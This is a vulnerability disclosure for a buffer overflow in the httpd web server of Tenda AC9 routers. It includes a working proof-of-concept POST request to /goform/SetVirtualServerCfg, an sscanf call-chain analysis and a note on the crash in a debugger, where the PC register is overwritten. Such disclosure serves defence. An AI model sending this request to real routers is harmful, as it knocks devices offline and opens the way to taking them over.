# Tenda AC9 0day Vulnerability report

## 1、Basci information

vendor: Tenda

product: AC9 and so on

version: V1.0V15.03.05.19（6318）、V3.0V15.03.06.42_multi and so on

Vulnerability type: buffer overflow

Vulnerability Effect: Denial of Service

## 2、Principle description of vulnerability technology

Affected Vulnerability Components:
- File name: bin/httpd
- function: router virtual service setting

## 3、Vulnerability value

Stable reproducibility: Yes

exploit conditions：
- attack vector type: neighboring network
- Stability of exploit: every attack can be successful
- Whether the product is configured by default: there are loopholes in the functional components that are enabled at the factory

## 4、PoC

```
POST /goform/SetVirtualServerCfg HTTP/1.1
Host: 192.168.56.102
Proxy-Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6
Cookie: password=lqetgb
Content-Length: 821
    
list=1,1,1,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

## 5、Vulnerability principle

### 5.1 static analysis

After static analysis, the call chain of the function is as follows

```
formSetVirtualSer
  sub_763EC
    sscanf(v23, "%[^,]%*c%[^,]%*c%[^,]%*c%s", &v15, &v13, &v11, &v9) == 4
```

The vulnerability code is shown in the following figure. Because there is no restriction on the parameters passed in by the user, the user can pass in too long malicious data to the `list` parameter, which leads to buffer overflow and eventually causes the effect of denial of service

The detailed procedure is that the function `formSetVirtualSer(int a1)` corresponding to `/goform/SetVirtualServerCfg` receives the parameters from the outside, and at the same time, another function `sub _763ec (inta1, char *a2, unsigned _int8 a3)` is called inside this function, and `sscanf` is used to handle the outside

![](imgs/stack4/code1.PNG)

### 5.2 dynamic analysis

Accident scene when error is triggered

![](imgs/stack4/debug1.PNG)

After debugging, it can be found that the program made an error after executing ` ldr3, [PC, #0x114] ` with address 0x767f4. The reason is that the value of register PC changed into maliciously injected data, which caused the program to execute an illegal instruction and finally caused the program to crash

![](imgs/stack4/debug2.PNG)

## 6、CNVD reference 

[CNVD reference](https://www.cnvd.org.cn/flaw/show/CNVD-2021-24948)